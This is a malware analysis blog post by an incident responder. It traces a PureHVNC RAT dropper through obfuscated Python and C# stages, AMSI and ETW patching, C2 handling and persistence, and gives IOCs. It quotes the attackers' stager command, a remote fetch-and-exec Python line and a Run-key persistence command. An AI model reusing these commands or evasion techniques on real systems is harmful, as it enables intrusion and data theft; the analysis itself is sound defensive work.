---
title: Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer
date: 2025-08-06 01:00:00 +0530
categories: [Days of Security, Reverse Engineering, Incident Response, Malware Analysis]
tags: [Malware Analysis]
---
## Intro
This piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script & C# binary.  
To give more context to it. It was a PXAStealer attack as seen on [SentinelOne](https://www.sentinelone.com/labs/ghost-in-the-zip-new-pxa-stealer-and-its-telegram-powered-ecosystem/). SentinelOne focused more on the PXAStealer(DLL) aspect, whereas this one is a later step in the infection chain leading to persistence.  

### How we got here?
The user received a phishing link on their personal email address and opened it on their corporate device and it started the infection. It originated through a  .lnk file which is consistent with previous PureHVNC and PXAStealer infections. The .lnk file included a obfuscated script which initiated the download of a master zip archive.  
That was followed by the creation more zip archives with .pdf extension which originated from master zip file and were extracted. Python launcher, malicious dll(PXAStealer) and all dependencies were extracted from the zip archives in the "C:\Users\Public\Windows\" directory and once the DLL was sideloaded into MS Word binary, it executed the below mentioned command and which in turn exectued python script in memory. I can't share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened mainly through memory only. Here's the initial stager command from the sideloaded DLL. 
```
cmd /c cd "" && start "Google Ads Playbook.docx" && certutil -decode Document.pdf Invoice.pdf && images.png x -ibck -y -poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\Users\\Public && del /s /q Document.pdf && del /s /q Invoice.pdf && del /s /q images.png && del /s /q "Contract Invoice.docx" && del /s /q "Evidence Report.docx" && cd C:\\Users\\Public\\Windows && start svchost.exe Lib\\images.png MR_Q_NEW_VER_BOT && exit && exit
```
Sadly I can't share the info on the very initial payload which initated the download due to undisclosable reason hence, the lack of information in this step. But the silver lining is that we have the actual malicious payload and we know the methodology followed by the stager. Let's begin with the actual payload. All the IOCs will be mentioned in the appendix.

### Initial script
The initial payload is a python script which is executed in memory with the following command  
```
svchost.exe -c "import.requests;exec(requests.get('hXXp://0x0[.]st/8nyT.py').txt)"
```  
That syntax oddly looks like python execution. Upon checking the hash of this extracted svchost, it was confirmed to be a normal python executable only.

Here's a small snippet of the script, it has strange function definitions and one huge chunk of encrypted text.  
![Initial_script](/assets/purehvnc-dropper/initial_script.png)  

It is base85 encoded, zlib compressed and a marshal code. I wrote a quick script to decode it.  
```
import base64, zlib
with open("weird.txt", "r") as f:
    b85_data = f.read().strip()
decoded = base64.b85decode(b85_data)
decompressed = zlib.decompress(decoded)
with open("decompressed.bin", "wb") as f:
    f.write(decompressed)
```  
This small script left us with marshal code. Since marshal code can only be decompiled with the python version it was written in, it took a little bit of hit and trial and with the help uncompyle6 and python 3.8.18 it was decoded.

### Second Stage
After following the decryption routine of the first script and decompiling the marshal code, the second script is visible.  
The second script also follows a similar footprint but with a lot more rigorous encryption. There is base85, zlib, AES, xor, RSA and a custom rc4 decryption routine. A private key is also included.    
![Second_Decryption_Routine](/assets/purehvnc-dropper/second_payload_decryptor.png)   

This the decryptor function & exec function   
![Second_Decryptor](/assets/purehvnc-dropper/Second_decryptor.png)  

To decrypt the payload from this script, the most convenient way is to use the existing decrytion function. In this instance it was quite troublesome to get the marshal code to decompile like earlier method, so I opted to extract the python bytecode disassembly.  

![Disassembler](/assets/purehvnc-dropper/disassembler.png)  

The decompiled bytecode gave quite a lot of information including the info on the target executable, which is RegAsm.exe. There are two payloads, one is a portable executable and second one is a shellcode. Before we dig into these, let's take a look at this script.  
This is a full-fledged process injection script with custom RC4 decryption logic. Both the payloads, PE & Shellcode use different keys for decryption. It first creates a suspended RegAsm.exe and attempts to inject the PE into it. If that fails it injects the shellcode payload into it's own process (svchost.exe or rather pythonw.exe in this case) and executes it. For the sake of readability, the screenshots are of the *python code generated from the bytecode*.  

Custom RC4 and PE injection function.   
![rc4_injection](/assets/purehvnc-dropper/rc4_injection_routine.png)   

Fallback Shellcode injection function.   
![fallback](/assets/purehvnc-dropper/Fallback_selfinjection.png)   

### Third Stage
Now it is time to move on from the python scripts. After base64 decode and RC4 decryption with my own script, It reveals two payloads  
- C# PE (Which is injected into RegAsm.exe)
- Donut Shellcode (Which is the failsafe method if the PE injection fails)  

Both are the same payloads just primary and failsafe delivery methods.  
Here will start with the C# file which is our normal .NET executable.  

![DIE_1](/assets/purehvnc-dropper/DetectitEasy_1.png)  

When looking it under CFF explorer, there is some unusual data.  
![CFF](/assets/purehvnc-dropper/CFF.png)  

It turned out to be another base64 payload. Which is much more evident when the file is explored in dnSpy.  
![wdckghr_crypted](/assets/purehvnc-dropper/dnspy_1.png)  
![wdckghr_crypted_2](/assets/purehvnc-dropper/dnspy_2.png)  

It also reveals that the original file name is Wdckghr_crypted. It hold one key and one base64 and xor'ed text. And it attempts to use textbook methods to patch AMSI & ETW to seemless script execution.  
AMSI  
![AMSIPatch](/assets/purehvnc-dropper/PatchAMSI.png)  
![AMSIPayload](/assets/purehvnc-dropper/AMSI_Payload.png)  

These functions collect the address of AMSI buffer in memory & patches the AMSI in such a way that it will always return 0x80070057(64-bit), which is the error code for invalid argument.

ETW  
![ETWPatch](/assets/purehvnc-dropper/PatchETW.png)  
![ETWPayload](/assets/purehvnc-dropper/ETWPayload.png)  

Similarly these collect the address of ETWEventWrite in memory & patches the ETW so that function will just "return"(Decoded payload - "C3") and do nothing. 

Below are the functions responsible for decoding and executing the next steps  

![function1](/assets/purehvnc-dropper/fun1.png)  
![function2](/assets/purehvnc-dropper/fun2.png)  

One small python script later, we have the next stage executable.  

### Fourth Stage
Similar to the previous stage, it is another C# file. Just in this case, instead of a long base64 string, we have a byte array and the original name of the file is Sydxj.exe.   

![DetectItEZ](/assets/purehvnc-dropper/DIE2.png)     
This is .Net Reactor obfucated file but we don't really need to know about it much as it just follows a decryption routine, nothing else.  

The main function is simply calling the MeasureSpec() which in turn is responsible for decoding the byte array.  

![Main](/assets/purehvnc-dropper/dnspy_2File_1.png)  
Drcryptor function   
![Decryptor_Function](/assets/purehvnc-dropper/dnspy_2File_2.png)  
Byte array  
![Byte_array](/assets/purehvnc-dropper/dnspy_2File_bytecode.png)  

As seen in the decryptor function, It call the function mentioned below which passes the execution to the final payload by call the function "PopSetStack()".    
![handover_Function](/assets/purehvnc-dropper/dnspy_2File_nextpayload.png)

To decode the byte array, I simply decided to patch the MeasureSpec() and modify it to dump the code instead of passing the execution to the next stage.  
![modified_Spec](/assets/purehvnc-dropper/modified_spec.png)  

And voila! We have final stage payload.  

### Final stage
The final payload is a DLL file, which is once again written in C#, making it "semi" easier to analyse.  
![DLL_PE](/assets/purehvnc-dropper/final_dll1.png)   
Once again this dll is protected by .NET Reactor obfuscator by [Eziriz](https://www.eziriz.com/dotnet_reactor.htm) which makes trying to read it normally exponentially hard. But luckily there is a tool call .[NET Reactor Slayer](https://github.com/SychicBoy/NETReactorSlayer) which made is super simple to deobfuscate and read with dnspy.  
![Net Reactor](/assets/purehvnc-dropper/net_reactor.png)  

Jumping straight into the PopSetStack() function as it was seen being called by the previous stage.  
![called_Funtion](/assets/purehvnc-dropper/popset.png)   
This function simply calls another function(RequestAttachedClient()) which is responsible for initiating and maintaining a connection to the C2 server as seen below.  

![RequestAttachedClient1](/assets/purehvnc-dropper/RequestAttachedClient1.png)  
![RequestAttachedClient2](/assets/purehvnc-dropper/RequestAttachClient2.png)  
![RequestAttachedClient3](/assets/purehvnc-dropper/RequestAttachedClient3.png)  

In short what the function is doing maintaining proper communication with the C2 and if the communication breaks, it attempts to reconnect.  

This whole function is a loop executed with the help of labels.  
- RequestCombinedClient() is used to extract C2 details and Cert and it saves it to containerSummarizer
- SendDetachedClient() is basically a flag. If it is set to be true, it means that the connection is established and it will be actively listening/reading information from C2 under the label IL_02DA. If it is set to false it will go to label IL_007F and retry connection
- Under the label IL_007F it disposes all the variables set like previous SSLStream, Timer(matcherClient) and basically resets connection.
- I will not be going into the depths of the all functions seen here but the gist is there

To gather the C2 information, there another base64 and Gzip compressed text.  
![cert function](/assets/purehvnc-dropper/cert.png)  

One quick run to the [CyberChef platform](https://gchq.github.io/CyberChef/)  and we have the C2 information and a certificate.  
![C2](/assets/purehvnc-dropper/c2.png)

Processing it with OpenSSL, it gives out valuable information  
![Cert_header](/assets/purehvnc-dropper/cert_head.png)  

If you've noticed there doesn't seem to be any kind of execution happening. After proper analysis of the other functions, it seems to be quite a modular RAT. It appears to be collecting other modules, binaries and/or commands from the C2 after the initial connection. The data which it receives is gzip compressed, which is decompressed by TokenizeBasicSingleton() through JoinAuthorizer(). 
![JoinAuthorize](/assets/purehvnc-dropper/Tokenizer_Actual_C2_Commands_Decoder.png)  

One more important thing - It uses protobuf library to deserialize data from C2.  

![Deserialize_Overview](/assets/purehvnc-dropper/deserialize_overview.png)  

It stores unique fingerprint of the infected system in "SOFTWARE//{runtime-generated-data}" registry  
![Key Stored](/assets/purehvnc-dropper/Get_Strategy.png)  
![Fingerprint Generated](/assets/purehvnc-dropper/DisconnectResponsiveChain.png)  
![Registry](/assets/purehvnc-dropper/Reg_key_SS.png)  

For persistence, it adds the very initial stager command in the HKCU\{User SID}\Software\Microsoft\Windows\CurrentVersion\Run  
```
cmd /c start C:\Users\Public\Windows\svchost.exe C:\Users\Public\Windows\Lib\images.png MR_Q_NEW_VER_BOT
```  

The mutex for this variant is "def" and it checks for this mutex before execution.    
![mutex](/assets/purehvnc-dropper/mutex.png)  

Below are a couple of screenshots from wireshark. One with internet enabled and one without.  
![with internet](/assets/purehvnc-dropper/On_internet_wireshark.png)  
![without internet](/assets/purehvnc-dropper/Off_Internet_wireshark.png)  

### Appendix

#### IOCs 

Hashes -  
61c0515c70a2b451d3d59f9450e5bd060f73290214ae6a6990db6adc04d534a7 - Initial lnk file  
6a51160fd443d4ddf69e0424d494e12436fbe0898756eeae6c79c77718760516 - Sideloaded DLL   
96637bc629ca866ab5aa176e7ccb3cff9f93c8f9d021520a97f527bfa9d56d7e - Wdckhgr_crypted - First stage after python execution  
289c09d43faaae05702f477f648dfd336085983f8253f834acd24960469335b7 - Donut shellcode  
5baa860a2ee10bc859f527c686ec8f25b74860fe5d0f9138f8c7aeeb8dade7f4 - Sydxj - Intermediary stage  
cb783c1e27455f90fdd558d2a10604e35f830b7a07e0d820d3e2b49f17d1f787 - Sctgvth - Final DLL  


C2 -  
162[.]218[.]115[.]218 (Connected on remote port 5600X)  

Certificate Fingerprint -   
SHA1 Fingerprint=CA:08:3A:47:C9:D5:C5:9B:FA:33:AB:56:97:8E:4D:1F:7B:5B:00:17  